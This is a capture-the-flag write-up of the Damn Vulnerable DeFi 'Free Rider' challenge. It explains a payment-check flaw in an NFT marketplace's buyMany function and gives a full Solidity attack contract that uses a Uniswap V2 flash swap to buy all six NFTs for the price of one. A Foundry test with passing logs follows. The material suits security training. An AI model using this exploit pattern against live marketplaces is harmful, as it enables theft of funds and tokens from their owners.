# Challenge - Free Rider

A new marketplace of Damn Valuable NFTs has been released! There’s been an initial mint of 6 NFTs, which are available for sale in the marketplace. Each one at 15 ETH.

A critical vulnerability has been reported, claiming that all tokens can be taken. Yet the developers don’t know how to save them!

They’re offering a bounty of 45 ETH for whoever is willing to take the NFTs out and send them their way. The recovery process is managed by a dedicated smart contract.

## Objective of CTF

You’ve agreed to help. Although, you only have 0.1 ETH in balance. The devs just won’t reply to your messages asking for more.

If only you could get free ETH, at least for an instant.

## Vulnerability Analysis

### Root Cause: Business Logic Flaw

This NFT marketplace offers 6 NFTs, each priced at 15 ETH. You can purchase multiple NFTs at once by calling the `buyMany()` function, as shown below:

```solidity
function buyMany(uint256[] calldata tokenIds) external payable nonReentrant {
    for (uint256 i = 0; i < tokenIds.length; ++i) {
        unchecked {
            _buyOne(tokenIds[i]);
        }
    }
}
```

The `buyMany()` function relies on the `_buyOne()` function to handle the purchase logic, and at first glance, it appears normal.

```solidity
function _buyOne(uint256 tokenId) private {
    uint256 priceToPay = offers[tokenId];
    if (priceToPay == 0) {
        revert TokenNotOffered(tokenId);
    }

    if (msg.value < priceToPay) {
        revert InsufficientPayment();
    }

    --offersCount;

    // transfer from seller to buyer
    DamnValuableNFT _token = token; // cache for gas savings
    _token.safeTransferFrom(_token.ownerOf(tokenId), msg.sender, tokenId);

    // pay seller using cached token
    payable(_token.ownerOf(tokenId)).sendValue(priceToPay);

    emit NFTBought(msg.sender, tokenId, priceToPay);
}
```

However, there is a common business logic flaw:

In the `buyMany()` function, the only payment requirement is that `msg.value` must be greater than `priceToPay` (15 ETH). The function does not check if `msg.value` is greater than the total price for all the NFTs being purchased (i.e., priceToPay multiplied by the number of NFTs). As a result, you can buy any number of NFTs, but only need to pay 15 ETH in total.

### Attack steps:

1. Request a flashloan from a Uniswap v2 pair to borrow WETH, and then unwrap it to ETH.
2. Purchase all 6 NFTs and transfer them to the `FreeRiderRecoveryManager` contract to claim the bounty.
3. Use the bounty to repay the flash loan and cover the fee.

## PoC test case

### Attack Contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {IERC721} from "@openzeppelin/contracts/token/ERC721/IERC721.sol";
import {Ownable} from "solady/auth/Ownable.sol";
import {DamnValuableNFT} from "../DamnValuableNFT.sol";

interface IWETH is IERC20 {
    function deposit() external payable;
    function withdraw(uint256 value) external;
}

interface IUniswapV2Pair {
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

interface IMarketplace {
    function buyMany(uint256[] calldata tokenIds) external payable;
}

contract AttackFreeRiders is Ownable {
    address private immutable nftMarketplace;
    address private immutable uniswapPool;
    address private immutable recoveryManager;
    address private immutable weth;
    address private immutable nft;

    constructor(address _nftMarketplace, address _uniswapPool, address _recoveryManager, address _weth, address _nft) {
        _initializeOwner(msg.sender);

        nftMarketplace = _nftMarketplace;
        uniswapPool = _uniswapPool;
        recoveryManager = _recoveryManager;

        weth = _weth;
        nft = _nft;
    }

    function attack(address _weth, uint256 flashLoanAmount) external onlyOwner {
        bytes memory data = abi.encode(_weth);
        IUniswapV2Pair(uniswapPool).swap(flashLoanAmount, 0, address(this), data);

        // send back all eth to player
        (bool success,) = owner().call{value: address(this).balance}("");
        require(success, "fail to transfer eth");
    }

    function uniswapV2Call(address sender, uint256 amount, uint256, bytes calldata data) external {
        require(msg.sender == uniswapPool, "invalid msg.sender");
        require(sender == address(this), "not from this contract");

        (address token) = abi.decode(data, (address));
        require(token == weth, "invalid token");

        // unwrap WETH first
        IWETH(weth).withdraw(amount);

        uint256[] memory tokenIds = new uint256[](6);
        for (uint256 i; i < 6; ++i) {
            tokenIds[i] = i;
        }

        // buy many nft at once buy only pay 15 eth
        IMarketplace(nftMarketplace).buyMany{value: amount}(tokenIds);

        // once we rescue the 6 NFTs, we will receive the 45 ETH prize from the FreeRiderRecoveryManager contract.
        for (uint256 i; i < 6; ++i) {
            IERC721(nft).safeTransferFrom(address(this), recoveryManager, tokenIds[i], abi.encode(address(this)));
        }

        // determine the required WETH to repay the Uniswap pool, wrap the necessary ETH into WETH, and repay the pool
        uint256 fee = amount * 3 / 997 + 1;
        uint256 amountToPay = amount + fee;
        IWETH(weth).deposit{value: amountToPay}();
        IWETH(weth).transfer(uniswapPool, amountToPay);
    }

    function onERC721Received(address, address, uint256, bytes memory) external pure returns (bytes4) {
        return AttackFreeRiders.onERC721Received.selector;
    }

    receive() external payable {}
}
```

### Test contract

```solidity
// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {WETH} from "solmate/tokens/WETH.sol";
import {IUniswapV2Pair} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import {IUniswapV2Factory} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol";
import {IUniswapV2Router02} from "@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {FreeRiderNFTMarketplace} from "../../src/free-rider/FreeRiderNFTMarketplace.sol";
import {FreeRiderRecoveryManager} from "../../src/free-rider/FreeRiderRecoveryManager.sol";
import {DamnValuableNFT} from "../../src/DamnValuableNFT.sol";
import {AttackFreeRiders} from "../../src/free-rider/AttackFreeRiders.sol";

contract FreeRiderChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recoveryManagerOwner = makeAddr("recoveryManagerOwner");

    // The NFT marketplace has 6 tokens, at 15 ETH each
    uint256 constant NFT_PRICE = 15 ether;
    uint256 constant AMOUNT_OF_NFTS = 6;
    uint256 constant MARKETPLACE_INITIAL_ETH_BALANCE = 90 ether;

    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 0.1 ether;
    uint256 constant BOUNTY = 45 ether;

    // Initial reserves for the Uniswap V2 pool
    uint256 constant UNISWAP_INITIAL_TOKEN_RESERVE = 15000e18;
    uint256 constant UNISWAP_INITIAL_WETH_RESERVE = 9000e18;

    WETH weth;
    DamnValuableToken token;
    IUniswapV2Factory uniswapV2Factory;
    IUniswapV2Router02 uniswapV2Router;
    IUniswapV2Pair uniswapPair;
    FreeRiderNFTMarketplace marketplace;
    DamnValuableNFT nft;
    FreeRiderRecoveryManager recoveryManager;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);
        // Player starts with limited ETH balance
        vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);

        // Deploy tokens to be traded
        token = new DamnValuableToken();
        weth = new WETH();

        // Deploy Uniswap V2 Factory and Router
        uniswapV2Factory = IUniswapV2Factory(deployCode("builds/uniswap/UniswapV2Factory.json", abi.encode(address(0))));
        uniswapV2Router = IUniswapV2Router02(
            deployCode("builds/uniswap/UniswapV2Router02.json", abi.encode(address(uniswapV2Factory), address(weth)))
        );

        token.approve(address(uniswapV2Router), UNISWAP_INITIAL_TOKEN_RESERVE);
        uniswapV2Router.addLiquidityETH{value: UNISWAP_INITIAL_WETH_RESERVE}(
            address(token), // token to be traded against WETH
            UNISWAP_INITIAL_TOKEN_RESERVE, // amountTokenDesired
            0, // amountTokenMin
            0, // amountETHMin
            deployer, // to
            block.timestamp * 2 // deadline
        );

        // Get a reference to the created Uniswap pair
        uniswapPair = IUniswapV2Pair(uniswapV2Factory.getPair(address(token), address(weth)));

        // Deploy the marketplace and get the associated ERC721 token
        // The marketplace will automatically mint AMOUNT_OF_NFTS to the deployer (see `FreeRiderNFTMarketplace::constructor`)
        marketplace = new FreeRiderNFTMarketplace{value: MARKETPLACE_INITIAL_ETH_BALANCE}(AMOUNT_OF_NFTS);

        // Get a reference to the deployed NFT contract. Then approve the marketplace to trade them.
        nft = marketplace.token();
        nft.setApprovalForAll(address(marketplace), true);

        // Open offers in the marketplace
        uint256[] memory ids = new uint256[](AMOUNT_OF_NFTS);
        uint256[] memory prices = new uint256[](AMOUNT_OF_NFTS);
        for (uint256 i = 0; i < AMOUNT_OF_NFTS; i++) {
            ids[i] = i;
            prices[i] = NFT_PRICE;
        }
        marketplace.offerMany(ids, prices);

        // Deploy recovery manager contract, adding the player as the beneficiary
        recoveryManager =
            new FreeRiderRecoveryManager{value: BOUNTY}(player, address(nft), recoveryManagerOwner, BOUNTY);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        assertEq(player.balance, PLAYER_INITIAL_ETH_BALANCE);
        assertEq(uniswapPair.token0(), address(weth));
        assertEq(uniswapPair.token1(), address(token));
        assertGt(uniswapPair.balanceOf(deployer), 0);
        assertEq(nft.owner(), address(0));
        assertEq(nft.rolesOf(address(marketplace)), nft.MINTER_ROLE());
        // Ensure deployer owns all minted NFTs.
        for (uint256 id = 0; id < AMOUNT_OF_NFTS; id++) {
            assertEq(nft.ownerOf(id), deployer);
        }
        assertEq(marketplace.offersCount(), 6);
        assertTrue(nft.isApprovedForAll(address(recoveryManager), recoveryManagerOwner));
        assertEq(address(recoveryManager).balance, BOUNTY);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_freeRider() public checkSolvedByPlayer {
        emit log("-------------------------- Before exploit --------------------------");
        emit log_named_uint("nft token in the marketplace contract", marketplace.offersCount());
        emit log_named_uint("nft token in the recovery manager contract", nft.balanceOf(address(recoveryManager)));
        emit log_named_decimal_uint("ETH in the marketplace contract", address(marketplace).balance, 18);
        emit log_named_decimal_uint("ETH in the recovery manager contract", address(recoveryManager).balance, 18);
        emit log_named_decimal_uint("ETH in the player adress", address(player).balance, 18);

        AttackFreeRiders maliciousContract = new AttackFreeRiders(
            address(marketplace), address(uniswapPair), address(recoveryManager), address(weth), address(nft)
        );

        maliciousContract.attack(address(weth), 15 ether);

        emit log("-------------------------- After exploit --------------------------");
        emit log_named_uint("nft token in the marketplace contract", marketplace.offersCount());
        emit log_named_uint("nft token in the recovery manager contract", nft.balanceOf(address(recoveryManager)));
        emit log_named_decimal_uint("ETH in the marketplace contract", address(marketplace).balance, 18);
        emit log_named_decimal_uint("ETH in the recovery manager contract", address(recoveryManager).balance, 18);
        emit log_named_decimal_uint("ETH in the player adress", address(player).balance, 18);
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private {
        // The recovery owner extracts all NFTs from its associated contract
        for (uint256 tokenId = 0; tokenId < AMOUNT_OF_NFTS; tokenId++) {
            vm.prank(recoveryManagerOwner);
            nft.transferFrom(address(recoveryManager), recoveryManagerOwner, tokenId);
            assertEq(nft.ownerOf(tokenId), recoveryManagerOwner);
        }

        // Exchange must have lost NFTs and ETH
        assertEq(marketplace.offersCount(), 0);
        assertLt(address(marketplace).balance, MARKETPLACE_INITIAL_ETH_BALANCE);

        // Player must have earned all ETH
        assertGt(player.balance, BOUNTY);
        assertEq(address(recoveryManager).balance, 0);
    }
}
```

### Test Result

```
Ran 2 tests for test/free-rider/FreeRider.t.sol:FreeRiderChallenge
[PASS] test_assertInitialState() (gas: 82197)
[PASS] test_freeRider() (gas: 1100762)
Logs:
  -------------------------- Before exploit --------------------------
  nft token in the marketplace contract: 6
  nft token in the recovery manager contract: 0
  ETH in the marketplace contract: 90.000000000000000000
  ETH in the recovery manager contract: 45.000000000000000000
  ETH in the player adress: 0.100000000000000000
  -------------------------- After exploit --------------------------
  nft token in the marketplace contract: 0
  nft token in the recovery manager contract: 6
  ETH in the marketplace contract: 15.000000000000000000
  ETH in the recovery manager contract: 0.000000000000000000
  ETH in the player adress: 120.054864593781344032

Suite result: ok. 2 passed; 0 failed; 0 skipped; finished in 12.83ms (2.96ms CPU time)

Ran 1 test suite in 242.27ms (12.83ms CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)
```
